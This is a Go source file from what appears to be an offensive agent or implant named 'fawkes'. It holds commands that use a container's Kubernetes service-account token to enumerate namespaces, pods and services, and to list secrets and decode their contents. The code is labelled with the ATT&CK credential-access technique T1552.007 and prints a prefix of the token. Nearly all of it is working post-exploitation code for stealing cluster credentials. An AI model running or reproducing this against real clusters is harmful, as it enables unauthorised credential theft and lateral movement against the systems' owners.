//go:build linux

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"
)

// escapeK8sEnum enumerates K8s resources: namespaces, pods, services, nodes.
func escapeK8sEnum(args containerEscapeArgs) (string, string) {
	kc, err := newK8sClient()
	if err != nil {
		return fmt.Sprintf("K8s enumeration failed: %v", err), "error"
	}
	defer structs.ZeroString(&kc.token)

	var sb strings.Builder
	sb.WriteString("=== KUBERNETES ENUMERATION ===\n\n")
	sb.WriteString(fmt.Sprintf("API Server: %s\n", kc.apiServer))
	sb.WriteString(fmt.Sprintf("Namespace:  %s\n", kc.namespace))
	sb.WriteString(fmt.Sprintf("Token:      %s...\n\n", kc.token[:min(30, len(kc.token))]))

	sb.WriteString("--- Namespaces ---\n")
	if data, code, err := kc.k8sGet("/api/v1/namespaces"); err == nil {
		if code == 200 {
			var nsList struct {
				Items []struct {
					Metadata struct {
						Name string `json:"name"`
					} `json:"metadata"`
					Status struct {
						Phase string `json:"phase"`
					} `json:"status"`
				} `json:"items"`
			}
			if json.Unmarshal(data, &nsList) == nil {
				for _, ns := range nsList.Items {
					sb.WriteString(fmt.Sprintf("  %s (%s)\n", ns.Metadata.Name, ns.Status.Phase))
				}
				sb.WriteString(fmt.Sprintf("  Total: %d namespace(s)\n", len(nsList.Items)))
			}
		} else {
			sb.WriteString(fmt.Sprintf("  Access denied (HTTP %d) — listing current namespace only\n", code))
		}
		structs.ZeroBytes(data)
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	ns := kc.namespace
	if args.Path != "" {
		ns = args.Path
	}
	sb.WriteString(fmt.Sprintf("\n--- Pods (namespace: %s) ---\n", ns))
	if data, code, err := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods", ns)); err == nil {
		if code == 200 {
			var podList struct {
				Items []struct {
					Metadata struct {
						Name      string `json:"name"`
						Namespace string `json:"namespace"`
					} `json:"metadata"`
					Status struct {
						Phase  string `json:"phase"`
						PodIP  string `json:"podIP"`
						HostIP string `json:"hostIP"`
					} `json:"status"`
					Spec struct {
						NodeName   string `json:"nodeName"`
						Containers []struct {
							Name  string `json:"name"`
							Image string `json:"image"`
						} `json:"containers"`
					} `json:"spec"`
				} `json:"items"`
			}
			if json.Unmarshal(data, &podList) == nil {
				for _, pod := range podList.Items {
					containers := make([]string, 0, len(pod.Spec.Containers))
					for _, c := range pod.Spec.Containers {
						containers = append(containers, c.Image)
					}
					sb.WriteString(fmt.Sprintf("  %-40s %s  IP:%s  Node:%s  [%s]\n",
						pod.Metadata.Name, pod.Status.Phase, pod.Status.PodIP,
						pod.Spec.NodeName, strings.Join(containers, ",")))
				}
				sb.WriteString(fmt.Sprintf("  Total: %d pod(s)\n", len(podList.Items)))
			}
		} else {
			sb.WriteString(fmt.Sprintf("  Access denied (HTTP %d)\n", code))
		}
		structs.ZeroBytes(data)
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	sb.WriteString(fmt.Sprintf("\n--- Services (namespace: %s) ---\n", ns))
	if data, code, err := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/services", ns)); err == nil {
		if code == 200 {
			var svcList struct {
				Items []struct {
					Metadata struct {
						Name string `json:"name"`
					} `json:"metadata"`
					Spec struct {
						Type      string `json:"type"`
						ClusterIP string `json:"clusterIP"`
						Ports     []struct {
							Port     int    `json:"port"`
							Protocol string `json:"protocol"`
						} `json:"ports"`
					} `json:"spec"`
				} `json:"items"`
			}
			if json.Unmarshal(data, &svcList) == nil {
				for _, svc := range svcList.Items {
					ports := make([]string, 0, len(svc.Spec.Ports))
					for _, p := range svc.Spec.Ports {
						ports = append(ports, fmt.Sprintf("%d/%s", p.Port, p.Protocol))
					}
					sb.WriteString(fmt.Sprintf("  %-30s %s  %s  [%s]\n",
						svc.Metadata.Name, svc.Spec.Type, svc.Spec.ClusterIP,
						strings.Join(ports, ",")))
				}
				sb.WriteString(fmt.Sprintf("  Total: %d service(s)\n", len(svcList.Items)))
			}
		} else {
			sb.WriteString(fmt.Sprintf("  Access denied (HTTP %d)\n", code))
		}
		structs.ZeroBytes(data)
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	return sb.String(), "success"
}

// escapeK8sSecrets lists and reads K8s secrets (T1552.007).
func escapeK8sSecrets(args containerEscapeArgs) (string, string) {
	kc, err := newK8sClient()
	if err != nil {
		return fmt.Sprintf("K8s secrets access failed: %v", err), "error"
	}
	defer structs.ZeroString(&kc.token)

	ns := kc.namespace
	if args.Path != "" {
		ns = args.Path
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== KUBERNETES SECRETS (namespace: %s) ===\n\n", ns))

	if args.Command != "" {
		return k8sReadSecret(kc, ns, args.Command)
	}

	data, code, err := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/secrets", ns))
	if err != nil {
		return fmt.Sprintf("Failed to list secrets: %v", err), "error"
	}
	defer structs.ZeroBytes(data)

	if code != 200 {
		return fmt.Sprintf("Access denied listing secrets (HTTP %d)", code), "error"
	}

	var secretList struct {
		Items []struct {
			Metadata struct {
				Name      string `json:"name"`
				Namespace string `json:"namespace"`
			} `json:"metadata"`
			Type string `json:"type"`
			Data map[string]string `json:"data"`
		} `json:"items"`
	}
	if err := json.Unmarshal(data, &secretList); err != nil {
		return fmt.Sprintf("Failed to parse secrets: %v", err), "error"
	}

	for _, secret := range secretList.Items {
		keys := make([]string, 0, len(secret.Data))
		for k := range secret.Data {
			keys = append(keys, k)
		}
		sb.WriteString(fmt.Sprintf("  %-40s %s  keys:[%s]\n",
			secret.Metadata.Name, secret.Type, strings.Join(keys, ",")))
	}
	sb.WriteString(fmt.Sprintf("\nTotal: %d secret(s)\n", len(secretList.Items)))
	sb.WriteString("\nUse -command <secret-name> to read a specific secret's data\n")

	return sb.String(), "success"
}

// k8sReadSecret reads and decodes a specific K8s secret.
func k8sReadSecret(kc *k8sClient, namespace, secretName string) (string, string) {
	data, code, err := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/secrets/%s", namespace, secretName))
	if err != nil {
		return fmt.Sprintf("Failed to read secret '%s': %v", secretName, err), "error"
	}
	defer structs.ZeroBytes(data)

	if code != 200 {
		return fmt.Sprintf("Access denied reading secret '%s' (HTTP %d)", secretName, code), "error"
	}

	var secret struct {
		Metadata struct {
			Name      string `json:"name"`
			Namespace string `json:"namespace"`
		} `json:"metadata"`
		Type string `json:"type"`
		Data map[string]string `json:"data"`
	}
	if err := json.Unmarshal(data, &secret); err != nil {
		return fmt.Sprintf("Failed to parse secret: %v", err), "error"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Secret: %s (type: %s) ===\n\n", secret.Metadata.Name, secret.Type))

	for key, encodedVal := range secret.Data {
		decoded, err := base64.StdEncoding.DecodeString(encodedVal)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[%s] (decode error: %v)\n", key, err))
			continue
		}
		val := string(decoded)
		structs.ZeroBytes(decoded)
		sb.WriteString(fmt.Sprintf("[%s]\n%s\n\n", key, val))
	}

	return sb.String(), "success"
}
